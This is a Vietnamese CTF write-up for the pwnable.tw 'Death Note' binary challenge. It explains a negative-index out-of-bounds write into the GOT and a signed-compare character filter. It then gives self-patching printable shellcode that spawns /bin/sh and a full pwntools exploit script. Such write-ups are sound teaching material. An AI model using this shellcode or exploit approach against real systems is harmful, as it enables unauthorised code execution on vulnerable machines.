+++
title = 'Pwnable.tw - Death Note'
date = 2026-09-18T21:56:25+07:00
draft = false
categories = ["pwn"]
series = ["Pwnable.tw"]
+++

## Death Note

`nc chall.pwnable.tw 10201`

### 1. Phân tích Binary

```js
pwndbg> checksec
File:       /home/lwd3c/Desktop/Pwn/pwnable.tw/deathnote/death_note
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x8048000)
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
```

`GNU_STACK` là `RWE` nên trên kernel cũ của server, heap cũng thực thi được. GOT ở `0x804a000-0x804a038`, mảng `note[]` trong `.bss` ở `0x804a060`.

```c
// read_int @ 0x804868a
char buf[16];
read(0, buf, 0xF);
return atoi(buf);          // trả int, CÓ THỂ ÂM
```

```c
// add_note @ 0x804874f
v1 = read_int();
if (v1 > 10) { puts("Out of bound !!"); exit(0); }   // chỉ chặn cận TRÊN
read_input(s, 0x50);
if (!is_printable(s)) { exit(-1); }
note[v1] = strdup(s);
```

`del_note` và `show_note` cũng chỉ kiểm tra `v1 > 10`.

#### Bug - signed index out-of-bounds

Không hàm nào kiểm tra `v1 < 0`. Với chỉ số âm, `note[v1]` = `0x804a060 + 4*v1` trỏ xuống dưới `.bss`, tức là vào **GOT**:

```js
free@got = 0x804a014  ->  index = (0x804a014 - 0x804a060) / 4 = -19
atoi@got = 0x804a034  ->  index = (0x804a034 - 0x804a060) / 4 = -11
```

`add_note` ghi giá trị là con trỏ heap (do `strdup`) vào `note[index]`. Chỉ số âm nghĩa là **ghi con trỏ heap vào một entry GOT bất kỳ**. Giá trị ghi không tự chọn được, nhưng đó lại là con trỏ tới chính chuỗi ta vừa nhập.

#### Bộ lọc ký tự

```c
// is_printable @ 0x80486f9
for (i = 0; strlen(s) > i; ++i)
    if (s[i] <= 31 || s[i] == 127)
        return 0;
return 1;
```

Đọc code C thì tưởng byte `>= 0x80` vẫn lọt, nhưng disassembly thực tế:

```asm
movzx eax, byte ptr [eax]
cmp   al, 1Fh
jle   loc_8048726             ; return 0
cmp   al, 7Fh
jnz   loc_804872D
```

`jle` là nhảy **có dấu**. Byte `>= 0x80` thành số âm khi so sánh signed nên bị loại luôn. Phạm vi hợp lệ thật sự là `[0x21 .. 0x7e]` - đã A/B test từng byte trên binary thật, không suy từ code C.

### 2. Khai thác

1. `add_note(-19, shellcode)` → `free@got` = con trỏ heap `P` trỏ tới shellcode
2. `del_note(-19)` → `free(note[-19])` = `free(P)`, mà `free@got` giờ bằng `P` nên nhảy thẳng vào shellcode

Lúc shellcode chạy (thay cho `free`):

```js
[esp]   = ret addr trong del_note
[esp+4] = P          <- chính là địa chỉ shellcode (tham số của free)
```

Nên `pop eax; pop eax` là lấy được địa chỉ của chính mình, không cần leak gì cả.

#### Shellcode in được, tự vá `int 0x80`

Tên phải nằm trong `[0x21..0x7e]` nên không thể chứa sẵn `cd 80`. Cách làm: để hai byte giữ chỗ in được ở cuối rồi tự vá lúc chạy bằng `sub byte ptr [ebp+disp8], al` (opcode `28 45 xx` - bản thân đều là byte in được).

```nasm
pop  eax               ; bỏ ret addr
pop  eax               ; eax = P
push eax; pop ebp      ; ebp = P (base để tự vá)

push 0x21; pop eax
sub  al, 0x21          ; eax = 0
push eax               ; NUL
push 0x68732f2f        ; "//sh"
push 0x6e69622f        ; "/bin"
push esp; pop ebx      ; ebx = &"/bin//sh"
push eax; pop ecx      ; ecx = 0
push eax; pop edx      ; edx = 0

push 0x54; pop eax
sub  byte [ebp+0x2d], al   ; 0x21 - 0x54 = 0xcd
push 0x21; pop eax
sub  al, 0x23              ; al = 0xfe
sub  byte [ebp+0x2e], al   ; 0x7e - 0xfe = 0x80
push 0x6b; pop eax
sub  al, 0x60              ; eax = 0x0b (execve)
.db 0x21                   ; +0x2d -> runtime thành 0xcd
.db 0x7e                   ; +0x2e -> runtime thành 0x80
```

Chạy tới hai byte cuối thì chúng đã là `cd 80` = `int 0x80`, với `eax=0xb, ebx=&"/bin//sh", ecx=edx=0` → `execve`.

#### Local vs remote

Local trên Ubuntu kernel 64-bit chạy binary 32-bit thì `/proc/pid/maps` cho thấy `[heap] rw-p`, không exec, nhảy vào là SIGSEGV. Server pwnable.tw chạy kernel cũ nên heap exec được - đúng ý đồ bài. Để xác minh local, dùng harness `LD_PRELOAD` `mprotect` vùng brk-heap thành RWX, payload giữ nguyên.

```bash
id  => uid=1000(death_note) gid=1000(death_note) groups=1000(death_note)
flag => FLAG{sh3llc0d3_is_s0_b34ut1ful}
```

`FLAG: FLAG{sh3llc0d3_is_s0_b34ut1ful}`

```py
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
context.log_level = 'info'

FREE_GOT  = 0x804a014
NOTE_BASE = 0x804a060
IDX_FREE  = (FREE_GOT - NOTE_BASE) // 4   # -19

sc = (
    b'\x58\x58'                      # pop eax; pop eax      eax = P
    b'\x50\x5d'                      # push eax; pop ebp     ebp = P
    b'\x6a\x21\x58\x2c\x21'          # eax = 0
    b'\x50'                          # push 0
    b'\x68\x2f\x2f\x73\x68'          # push "//sh"
    b'\x68\x2f\x62\x69\x6e'          # push "/bin"
    b'\x54\x5b'                      # ebx = esp
    b'\x50\x59'                      # ecx = 0
    b'\x50\x5a'                      # edx = 0
    b'\x6a\x54\x58'                  # eax = 0x54
    b'\x28\x45\x2d'                  # sub [ebp+0x2d], al   -> 0xcd
    b'\x6a\x21\x58\x2c\x23'          # eax = 0xfe
    b'\x28\x45\x2e'                  # sub [ebp+0x2e], al   -> 0x80
    b'\x6a\x6b\x58\x2c\x60'          # eax = 0x0b
    b'\x21\x7e'                      # => cd 80 (int 0x80)
)
assert all(0x21 <= b <= 0x7e for b in sc)

def exploit():
    if args.REMOTE:
        io = remote('chall.pwnable.tw', 10201)
    else:
        io = process('./death_note')
    io.sendlineafter(b'Your choice :', b'1')
    io.sendafter(b'Index :', str(IDX_FREE).encode() + b'\n')
    io.sendafter(b'Name :', sc + b'\n')
    io.sendlineafter(b'Your choice :', b'3')
    io.sendafter(b'Index :', str(IDX_FREE).encode() + b'\n')
    return io

io = exploit()
io.sendline(b'cat /home/death_note/flag')
io.interactive()
```
